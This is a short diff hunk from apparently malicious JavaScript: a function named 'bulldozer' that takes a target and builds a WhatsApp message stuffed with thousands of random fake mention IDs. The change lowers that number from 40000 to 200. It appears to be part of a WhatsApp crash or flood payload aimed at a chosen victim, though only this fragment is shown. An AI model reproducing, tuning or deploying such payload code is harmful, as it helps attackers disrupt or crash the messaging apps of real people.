@@ -47,7 +47,7 @@ async function bulldozer(axiom, target) {
           contextInfo: {
             mentionedJid: [
               "0@s.whatsapp.net",
-              ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
+              ...Array.from({ length: 200 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
             ],
           },
         },
